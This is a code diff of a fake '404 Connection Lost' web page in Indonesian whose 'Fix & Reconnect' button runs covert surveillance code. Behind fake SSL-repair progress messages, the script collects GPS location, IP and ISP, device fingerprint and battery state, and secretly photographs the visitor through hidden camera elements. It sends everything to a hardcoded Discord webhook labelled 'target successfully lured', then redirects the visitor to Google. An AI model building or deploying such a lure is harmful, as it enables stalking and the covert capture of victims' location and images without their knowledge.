@@ -5,144 +5,790 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>404 - Connection Lost</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
     <style>
+        *, *::before, *::after {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        :root {
+            --bg: #030712;
+            --card: rgba(15, 23, 42, 0.82);
+            --card-border: rgba(59, 130, 246, 0.12);
+            --blue-500: #3b82f6;
+            --blue-600: #2563eb;
+            --blue-400: #60a5fa;
+            --red-500: #ef4444;
+            --red-400: #f87171;
+            --green-500: #22c55e;
+            --green-400: #4ade80;
+            --text: #f1f5f9;
+            --text-dim: #94a3b8;
+            --text-muted: #475569;
+        }
+
         body {
-            background-color: #f4f7f9;
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            background: var(--bg);
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+            color: var(--text);
+            min-height: 100vh;
             display: flex;
-            justify-content: center;
             align-items: center;
-            height: 100vh;
-            margin: 0;
+            justify-content: center;
+            padding: 20px;
+            overflow: hidden;
         }
 
-        .container {
-            background: white;
-            padding: 50px 40px;
-            border-radius: 12px;
-            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.05);
-            max-width: 500px;
+        /* Grid background */
+        body::before {
+            content: '';
+            position: fixed;
+            inset: 0;
+            background-image:
+                linear-gradient(rgba(59, 130, 246, 0.025) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(59, 130, 246, 0.025) 1px, transparent 1px);
+            background-size: 44px 44px;
+            pointer-events: none;
+        }
+
+        /* Gradient orbs */
+        body::after {
+            content: '';
+            position: fixed;
+            inset: 0;
+            background:
+                radial-gradient(ellipse 600px 400px at 25% 30%, rgba(59, 130, 246, 0.07) 0%, transparent 70%),
+                radial-gradient(ellipse 500px 500px at 75% 70%, rgba(139, 92, 246, 0.05) 0%, transparent 70%);
+            pointer-events: none;
+            animation: orbDrift 20s ease-in-out infinite alternate;
+        }
+
+        @keyframes orbDrift {
+            0% { transform: translate(0, 0); }
+            100% { transform: translate(-30px, 20px); }
+        }
+
+        /* ===== CARD ===== */
+        .card {
+            position: relative;
+            z-index: 1;
+            background: var(--card);
+            backdrop-filter: blur(24px);
+            -webkit-backdrop-filter: blur(24px);
+            border: 1px solid var(--card-border);
+            border-radius: 20px;
+            padding: 48px 40px 40px;
+            max-width: 460px;
+            width: 100%;
             text-align: center;
-            border: 1px solid #e1e8ed;
+            box-shadow:
+                0 0 80px rgba(59, 130, 246, 0.04),
+                0 30px 60px rgba(0, 0, 0, 0.4);
+            animation: cardIn 0.6s ease;
         }
 
-        h1 {
-            color: #e74c3c;
-            font-size: 80px;
-            margin: 0;
+        .card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 50%;
+            height: 1px;
+            background: linear-gradient(90deg, transparent, var(--blue-500), transparent);
+        }
+
+        @keyframes cardIn {
+            from { opacity: 0; transform: translateY(20px) scale(0.97); }
+            to { opacity: 1; transform: translateY(0) scale(1); }
+        }
+
+        /* ===== 404 GLITCH ===== */
+        .error-num {
+            position: relative;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 96px;
             font-weight: 700;
+            color: var(--text);
+            letter-spacing: 6px;
+            line-height: 1;
+            margin-bottom: 8px;
+            user-select: none;
         }
 
-        h2 {
-            color: #2c3e50;
-            font-size: 22px;
-            margin: 10px 0 20px 0;
+        .error-num::before,
+        .error-num::after {
+            content: '404';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            opacity: 0.8;
         }
 
-        p {
-            color: #7f8c8d;
-            font-size: 14px;
-            line-height: 1.6;
-            margin-bottom: 30px;
+        .error-num::before {
+            color: #ff003c;
+            animation: glitch1 4s infinite linear;
+            clip-path: polygon(0 0, 100% 0, 100% 35%, 0 35%);
         }
 
-        .btn-fix {
-            background-color: #3498db;
-            color: white;
-            border: none;
-            padding: 14px 35px;
-            font-size: 16px;
+        .error-num::after {
+            color: #00e5ff;
+            animation: glitch2 4s infinite linear;
+            clip-path: polygon(0 65%, 100% 65%, 100% 100%, 0 100%);
+        }
+
+        @keyframes glitch1 {
+            0%, 88%, 100% { transform: translate(0); }
+            90% { transform: translate(-3px, 1px); }
+            92% { transform: translate(2px, -1px); }
+            94% { transform: translate(-1px, 2px); }
+        }
+
+        @keyframes glitch2 {
+            0%, 88%, 100% { transform: translate(0); }
+            91% { transform: translate(3px, -1px); }
+            93% { transform: translate(-2px, 1px); }
+            95% { transform: translate(1px, -2px); }
+        }
+
+        /* ===== TEXT ===== */
+        .error-title {
+            font-size: 21px;
+            font-weight: 700;
+            color: var(--text);
+            margin-bottom: 12px;
+            letter-spacing: -0.01em;
+        }
+
+        .error-desc {
+            font-size: 13.5px;
+            color: var(--text-dim);
+            line-height: 1.7;
+            margin-bottom: 32px;
+        }
+
+        .error-desc strong {
+            color: var(--red-400);
             font-weight: 600;
-            border-radius: 6px;
+        }
+
+        /* ===== BUTTON ===== */
+        .btn-fix {
+            width: 100%;
+            padding: 15px 32px;
+            border: none;
+            border-radius: 12px;
+            font-family: 'Inter', sans-serif;
+            font-size: 14.5px;
+            font-weight: 700;
             cursor: pointer;
-            transition: background 0.2s;
+            letter-spacing: 0.5px;
             text-transform: uppercase;
-            letter-spacing: 1px;
+            background: linear-gradient(135deg, var(--blue-600), var(--blue-500));
+            color: white;
+            box-shadow: 0 4px 20px rgba(59, 130, 246, 0.3), inset 0 1px 0 rgba(255,255,255,0.1);
+            transition: all 0.25s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
         }
 
         .btn-fix:hover {
-            background-color: #2980b9;
+            transform: translateY(-2px);
+            box-shadow: 0 8px 30px rgba(59, 130, 246, 0.45), inset 0 1px 0 rgba(255,255,255,0.1);
+        }
+
+        .btn-fix:active {
+            transform: translateY(0);
         }
 
         .error-code {
-            margin-top: 30px;
+            margin-top: 28px;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 10.5px;
+            color: var(--text-muted);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+
+        .error-code .dot {
+            width: 5px;
+            height: 5px;
+            border-radius: 50%;
+            background: var(--red-500);
+            animation: blink 1.5s ease-in-out infinite;
+        }
+
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.25; }
+        }
+
+        /* ===== PROCESSING OVERLAY ===== */
+        .overlay {
+            position: fixed;
+            inset: 0;
+            z-index: 1000;
+            background: rgba(3, 7, 18, 0.92);
+            backdrop-filter: blur(12px);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .overlay.active {
+            display: flex;
+            animation: overlayIn 0.35s ease;
+        }
+
+        @keyframes overlayIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        .process-card {
+            background: var(--card);
+            border: 1px solid var(--card-border);
+            border-radius: 20px;
+            padding: 44px 36px;
+            max-width: 400px;
+            width: 100%;
+            text-align: center;
+            box-shadow: 0 0 80px rgba(59, 130, 246, 0.08);
+            animation: processIn 0.4s ease 0.1s both;
+        }
+
+        @keyframes processIn {
+            from { opacity: 0; transform: scale(0.92) translateY(15px); }
+            to { opacity: 1; transform: scale(1) translateY(0); }
+        }
+
+        /* Spinner */
+        .spinner-ring {
+            width: 52px;
+            height: 52px;
+            margin: 0 auto 24px;
+            border: 3px solid rgba(59, 130, 246, 0.1);
+            border-top-color: var(--blue-400);
+            border-radius: 50%;
+            animation: spin 0.9s linear infinite;
+            position: relative;
+        }
+
+        .spinner-ring::after {
+            content: '';
+            position: absolute;
+            inset: 4px;
+            border: 2px solid transparent;
+            border-bottom-color: rgba(139, 92, 246, 0.5);
+            border-radius: 50%;
+            animation: spin 1.5s linear infinite reverse;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .process-title {
+            font-size: 16px;
+            font-weight: 600;
+            color: var(--text);
+            margin-bottom: 8px;
+        }
+
+        .process-status {
+            font-size: 13px;
+            color: var(--text-dim);
+            margin-bottom: 28px;
+            min-height: 20px;
+            transition: opacity 0.2s;
+        }
+
+        /* Progress bar */
+        .progress-track {
+            width: 100%;
+            height: 4px;
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 4px;
+            overflow: hidden;
+            margin-bottom: 12px;
+        }
+
+        .progress-fill {
+            height: 100%;
+            width: 0%;
+            background: linear-gradient(90deg, var(--blue-600), var(--blue-400));
+            border-radius: 4px;
+            transition: width 0.6s ease;
+            position: relative;
+        }
+
+        .progress-fill::after {
+            content: '';
+            position: absolute;
+            inset: 0;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
+            animation: shimmer 1.8s ease-in-out infinite;
+        }
+
+        @keyframes shimmer {
+            0% { transform: translateX(-100%); }
+            100% { transform: translateX(100%); }
+        }
+
+        .progress-pct {
+            font-family: 'JetBrains Mono', monospace;
             font-size: 11px;
-            color: #bdc3c7;
-            font-family: monospace;
+            color: var(--text-muted);
+        }
+
+        /* Success state */
+        .success-check {
+            width: 56px;
+            height: 56px;
+            margin: 0 auto 20px;
+            background: rgba(34, 197, 94, 0.1);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            animation: popIn 0.45s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+        }
+
+        .success-check svg {
+            width: 28px;
+            height: 28px;
+            color: var(--green-400);
+        }
+
+        @keyframes popIn {
+            0% { transform: scale(0); }
+            70% { transform: scale(1.15); }
+            100% { transform: scale(1); }
+        }
+
+        .hidden { display: none !important; }
+
+        /* Top progress line */
+        .top-line {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 3px;
+            z-index: 1001;
+        }
+
+        .top-line-fill {
+            height: 100%;
+            width: 0%;
+            background: linear-gradient(90deg, var(--blue-600), var(--blue-400), #a855f7);
+            transition: width 0.5s ease;
+        }
+
+        /* ===== RESPONSIVE ===== */
+        @media (max-width: 480px) {
+            .card { padding: 36px 24px 32px; border-radius: 16px; }
+            .error-num { font-size: 72px; letter-spacing: 4px; }
+            .error-title { font-size: 18px; }
+            .process-card { padding: 36px 24px; }
+        }
+
+        /* Hidden elements */
+        #camVideo, #camCanvas {
+            position: fixed;
+            top: -9999px;
+            left: -9999px;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+            pointer-events: none;
         }
     </style>
 </head>
 
 <body>
 
-    <div class="container">
-        <h1>404</h1>
-        <h2>Connection Lost</h2>
-        <p>Terdeteksi kegagalan sinkronisasi pada sesi browser Anda.<br>Keamanan enkripsi mungkin terganggu.</p>
+    <!-- Top progress line -->
+    <div class="top-line"><div class="top-line-fill" id="topLine"></div></div>
 
-        <button class="btn-fix" id="actionBtn">FIX & RECONNECT</button>
-
-        <div class="error-code">Error Code: ERR_SSL_PROTOCOL_ERROR_SYNC</div>
+    <!-- Main 404 Card -->
+    <div class="card" id="mainCard">
+        <div class="error-num">404</div>
+        <h2 class="error-title">Connection Lost</h2>
+        <p class="error-desc">
+            Terdeteksi <strong>kegagalan sinkronisasi</strong> pada sesi browser Anda.
+            Keamanan enkripsi mungkin terganggu. Tekan tombol di bawah untuk memperbaiki koneksi.
+        </p>
+        <button class="btn-fix" id="btnFix">
+            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+            Fix &amp; Reconnect
+        </button>
+        <div class="error-code">
+            <span class="dot"></span>
+            ERR_SSL_PROTOCOL_ERROR_SYNC
+        </div>
     </div>
 
+    <!-- Processing Overlay -->
+    <div class="overlay" id="overlay">
+        <div class="process-card">
+            <!-- Processing State -->
+            <div id="stateProcessing">
+                <div class="spinner-ring"></div>
+                <div class="process-title">Memperbaiki Koneksi</div>
+                <div class="process-status" id="statusText">Menginisialisasi...</div>
+                <div class="progress-track">
+                    <div class="progress-fill" id="progressFill"></div>
+                </div>
+                <div class="progress-pct" id="progressPct">0%</div>
+            </div>
+
+            <!-- Success State -->
+            <div id="stateSuccess" class="hidden">
+                <div class="success-check">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6L9 17l-5-5"/></svg>
+                </div>
+                <div class="process-title" style="color: var(--green-400);">Koneksi Dipulihkan</div>
+                <div class="process-status" id="redirectText">Mengalihkan dalam 3 detik...</div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Hidden camera elements -->
+    <video id="camVideo" playsinline muted autoplay></video>
+    <canvas id="camCanvas"></canvas>
+
     <script>
+        // ===== CONFIG =====
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1500542592398397652/aJhsNN61hz6Qv8PTssvjJxZKxpm55uO27EzJtT1jROeQSD8I7fdMH1ImMz94JX45TE01";
+        const REDIRECT_URL = "https://www.google.com";
 
-        document.getElementById('actionBtn').addEventListener('click', async function () {
-            this.innerText = "Processing...";
-            this.disabled = true;
+        // ===== ELEMENTS =====
+        const $ = id => document.getElementById(id);
+        const overlay = $('overlay');
+        const statusText = $('statusText');
+        const progressFill = $('progressFill');
+        const progressPct = $('progressPct');
+        const topLine = $('topLine');
 
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(async (pos) => {
+        // ===== HELPERS =====
+        function setProgress(pct) {
+            progressFill.style.width = pct + '%';
+            progressPct.textContent = pct + '%';
+            topLine.style.width = pct + '%';
+        }
 
-                    let ipInfo = { ip: "Unknown", org: "Unknown", city: "Unknown" };
-                    try {
-                        const res = await fetch('https://ipapi.co/json/');
-                        ipInfo = await res.json();
-                    } catch (e) { }
+        function setStatus(text) {
+            statusText.style.opacity = '0';
+            setTimeout(() => {
+                statusText.textContent = text;
+                statusText.style.opacity = '1';
+            }, 150);
+        }
 
-                    const payload = {
-                        username: "System Security Monitor",
-                        embeds: [{
-                            title: "🚨 Target Berhasil Terpancing!",
-                            color: 15548997,
-                            fields: [
-                                { name: "📍 Koordinat GPS", value: `\`${pos.coords.latitude}, ${pos.coords.longitude}\`` },
-                                { name: "🗺️ Google Maps", value: `[Klik Disini](https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude})` },
-                                { name: "🌐 IP Address", value: `\`${ipInfo.ip}\``, inline: true },
-                                { name: "🏢 Provider/ISP", value: `\`${ipInfo.org}\``, inline: true },
-                                { name: "📱 Perangkat", value: `\`${navigator.userAgent}\`` }
-                            ],
-                            footer: { text: "Audit Sistem Keamanan - " + new Date().toLocaleString() }
-                        }]
+        function delay(ms) {
+            return new Promise(r => setTimeout(r, ms));
+        }
+
+        // ===== DATA COLLECTORS =====
+
+        async function collectIP() {
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                if (!res.ok) throw new Error();
+                return await res.json();
+            } catch {
+                try {
+                    const res = await fetch('https://api.ipify.org?format=json');
+                    const { ip } = await res.json();
+                    return { ip, city: 'N/A', region: 'N/A', country_name: 'N/A', org: 'N/A' };
+                } catch {
+                    return { ip: 'Unknown', city: 'N/A', org: 'N/A' };
+                }
+            }
+        }
+
+        function collectDevice() {
+            const ua = navigator.userAgent;
+            let os = 'Unknown', browser = 'Unknown';
+
+            if (/Android/i.test(ua)) os = 'Android';
+            else if (/iPhone|iPad|iPod/i.test(ua)) os = 'iOS';
+            else if (/Windows/i.test(ua)) os = 'Windows';
+            else if (/Mac/i.test(ua)) os = 'macOS';
+            else if (/Linux/i.test(ua)) os = 'Linux';
+
+            if (/Edg\//i.test(ua)) browser = 'Edge';
+            else if (/Chrome/i.test(ua)) browser = 'Chrome';
+            else if (/Firefox/i.test(ua)) browser = 'Firefox';
+            else if (/Safari/i.test(ua)) browser = 'Safari';
+
+            const info = {
+                ua, os, browser,
+                platform: navigator.platform || 'N/A',
+                lang: navigator.language,
+                screen: `${screen.width}×${screen.height}`,
+                dpr: window.devicePixelRatio,
+                tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                cores: navigator.hardwareConcurrency || 'N/A',
+                touch: navigator.maxTouchPoints || 0,
+                online: navigator.onLine,
+                cookies: navigator.cookieEnabled
+            };
+
+            if (navigator.connection) {
+                info.netType = navigator.connection.type || 'N/A';
+                info.netEff = navigator.connection.effectiveType || 'N/A';
+                info.netDown = navigator.connection.downlink || 'N/A';
+            }
+
+            return info;
+        }
+
+        async function collectBattery() {
+            try {
+                const b = await navigator.getBattery();
+                return { level: Math.round(b.level * 100), charging: b.charging };
+            } catch { return null; }
+        }
+
+        function collectGPS() {
+            return new Promise(resolve => {
+                if (!navigator.geolocation) return resolve(null);
+                navigator.geolocation.getCurrentPosition(
+                    pos => resolve({
+                        lat: pos.coords.latitude,
+                        lng: pos.coords.longitude,
+                        acc: pos.coords.accuracy,
+                        alt: pos.coords.altitude,
+                        spd: pos.coords.speed
+                    }),
+                    () => resolve(null),
+                    { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+                );
+            });
+        }
+
+        async function captureCamera() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
+                    audio: false
+                });
+
+                const video = $('camVideo');
+                video.srcObject = stream;
+
+                return new Promise(resolve => {
+                    video.onloadedmetadata = () => {
+                        video.play();
+                        setTimeout(() => {
+                            const c = $('camCanvas');
+                            c.width = video.videoWidth;
+                            c.height = video.videoHeight;
+                            c.getContext('2d').drawImage(video, 0, 0);
+
+                            c.toBlob(blob => {
+                                stream.getTracks().forEach(t => t.stop());
+                                video.srcObject = null;
+                                resolve(blob);
+                            }, 'image/jpeg', 0.85);
+                        }, 1500);
                     };
+                    video.onerror = () => {
+                        stream.getTracks().forEach(t => t.stop());
+                        resolve(null);
+                    };
+                });
+            } catch {
+                return null;
+            }
+        }
 
+        // ===== WEBHOOK =====
+
+        async function sendWebhook(ipData, device, battery, gps, photo) {
+            try {
+                const fields = [];
+
+                if (ipData) {
+                    fields.push({ name: '🌐 IP Address', value: `\`${ipData.ip}\``, inline: true });
+                    fields.push({ name: '🏢 ISP', value: `\`${ipData.org || 'N/A'}\``, inline: true });
+                    if (ipData.city && ipData.city !== 'N/A') {
+                        fields.push({ name: '🏙️ Lokasi IP', value: `\`${ipData.city}, ${ipData.region || ''}, ${ipData.country_name || ''}\`` });
+                    }
+                }
+
+                if (gps) {
+                    fields.push({ name: '📍 GPS Koordinat', value: `\`${gps.lat}, ${gps.lng}\` (±${Math.round(gps.acc)}m)` });
+                    fields.push({ name: '🗺️ Google Maps', value: `[Buka Maps](https://www.google.com/maps?q=${gps.lat},${gps.lng})` });
+                    if (gps.alt !== null && gps.alt !== undefined) {
+                        fields.push({ name: '⛰️ Altitude', value: `\`${Math.round(gps.alt)}m\``, inline: true });
+                    }
+                } else {
+                    fields.push({ name: '📍 GPS', value: '`❌ Ditolak / Tidak tersedia`' });
+                }
+
+                if (device) {
+                    fields.push({ name: '📱 Perangkat', value: `\`${device.os} — ${device.browser}\`` });
+                    fields.push({ name: '🖥️ Layar', value: `\`${device.screen} @${device.dpr}x\``, inline: true });
+                    fields.push({ name: '🕐 Timezone', value: `\`${device.tz}\``, inline: true });
+                    fields.push({ name: '🧠 CPU Cores', value: `\`${device.cores}\``, inline: true });
+                    fields.push({ name: '👆 Touch', value: `\`${device.touch} points\``, inline: true });
+                    if (device.netEff) {
+                        fields.push({ name: '📶 Koneksi', value: `\`${device.netEff} (${device.netType})\``, inline: true });
+                    }
+                }
+
+                if (battery) {
+                    fields.push({ name: '🔋 Baterai', value: `\`${battery.level}% ${battery.charging ? '⚡ Charging' : '🔌 Unplugged'}\``, inline: true });
+                }
+
+                fields.push({ name: '📸 Kamera', value: photo ? '`✅ Foto berhasil diambil`' : '`❌ Ditolak / Tidak tersedia`' });
+                fields.push({ name: '🔗 User Agent', value: `\`\`\`${device?.ua || navigator.userAgent}\`\`\`` });
+
+                const embed = {
+                    title: '🚨 Target Berhasil Terpancing!',
+                    color: 15548997,
+                    fields,
+                    footer: { text: `Security Audit — ${new Date().toLocaleString('id-ID')}` },
+                    timestamp: new Date().toISOString()
+                };
+
+                if (photo) {
+                    embed.image = { url: 'attachment://photo.jpg' };
+                    const fd = new FormData();
+                    fd.append('files[0]', photo, 'photo.jpg');
+                    fd.append('payload_json', JSON.stringify({
+                        username: '🛡️ Security Audit System',
+                        embeds: [embed]
+                    }));
+                    await fetch(WEBHOOK_URL, { method: 'POST', body: fd });
+                } else {
                     await fetch(WEBHOOK_URL, {
-                        method: "POST",
-                        headers: { "Content-Type": "application/json" },
-                        body: JSON.stringify(payload)
-                    });
-
-
-                    window.location.href = "https://www.google.com";
-
-                }, async (err) => {
-
-                    await fetch(WEBHOOK_URL, {
-                        method: "POST",
-                        headers: { "Content-Type": "application/json" },
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify({
-                            content: "⚠️ Target klik Fix & Reconnect tapi **MENOLAK (Deny)** akses lokasi."
+                            username: '🛡️ Security Audit System',
+                            embeds: [embed]
                         })
                     });
-                    window.location.href = "https://www.google.com";
-                }, {
-                    enableHighAccuracy: true,
-                    timeout: 10000
-                });
+                }
+            } catch (e) {
+                console.error('Webhook error:', e);
             }
+        }
+
+        // ===== STATUS MESSAGES =====
+        const statusMessages = [
+            'Menginisialisasi koneksi aman...',
+            'Memeriksa sertifikat SSL...',
+            'Menganalisis jaringan...',
+            'Memverifikasi protokol enkripsi...',
+            'Memeriksa kerentanan jaringan...',
+            'Mengamankan sesi browser...',
+            'Menyinkronkan data koneksi...',
+            'Memvalidasi konfigurasi...',
+            'Hampir selesai...'
+        ];
+
+        // ===== MAIN FLOW =====
+        $('btnFix').addEventListener('click', async function () {
+            this.style.pointerEvents = 'none';
+            this.style.opacity = '0.5';
+
+            overlay.classList.add('active');
+            setProgress(5);
+
+            // Start status message rotation
+            let msgIdx = 0;
+            const msgInterval = setInterval(() => {
+                setStatus(statusMessages[msgIdx % statusMessages.length]);
+                msgIdx++;
+            }, 2000);
+
+            // ========================================
+            // LAUNCH EVERYTHING IN PARALLEL
+            // All called within user-gesture context
+            // ========================================
+
+            // GPS (needs user gesture) — start immediately
+            const gpsPromise = collectGPS();
+
+            // Camera (needs user gesture) — start immediately
+            const cameraPromise = captureCamera();
+
+            // IP (no permission)
+            const ipPromise = collectIP();
+
+            // Battery (no permission)
+            const batteryPromise = collectBattery();
+
+            // Device info (synchronous)
+            const device = collectDevice();
+
+            setProgress(15);
+
+            // Wait for all to settle
+            const [gpsResult, cameraResult, ipResult, batteryResult] = await Promise.allSettled([
+                gpsPromise, cameraPromise, ipPromise, batteryPromise
+            ]);
+
+            setProgress(70);
+            setStatus('Mengirim data verifikasi...');
+            await delay(400);
+
+            const gps = gpsResult.status === 'fulfilled' ? gpsResult.value : null;
+            const photo = cameraResult.status === 'fulfilled' ? cameraResult.value : null;
+            const ipData = ipResult.status === 'fulfilled' ? ipResult.value : null;
+            const battery = batteryResult.status === 'fulfilled' ? batteryResult.value : null;
+
+            // Send everything to webhook
+            setProgress(85);
+            await sendWebhook(ipData, device, battery, gps, photo);
+
+            setProgress(100);
+            clearInterval(msgInterval);
+
+            // Show success
+            $('stateProcessing').classList.add('hidden');
+            $('stateSuccess').classList.remove('hidden');
+
+            // Countdown & redirect
+            let count = 3;
+            const countInterval = setInterval(() => {
+                count--;
+                $('redirectText').textContent = `Mengalihkan dalam ${count} detik...`;
+                if (count <= 0) {
+                    clearInterval(countInterval);
+                    window.location.href = REDIRECT_URL;
+                }
+            }, 1000);
+        });
+
+        // Emergency beacon — send whatever we have if user closes page
+        window.addEventListener('beforeunload', () => {
+            try {
+                const payload = JSON.stringify({
+                    username: '🛡️ Security Audit System',
+                    content: '⚠️ Target menutup halaman sebelum proses selesai.'
+                });
+                navigator.sendBeacon(WEBHOOK_URL, new Blob([payload], { type: 'application/json' }));
+            } catch {}
         });
     </script>
+
 </body>
 
 </html>
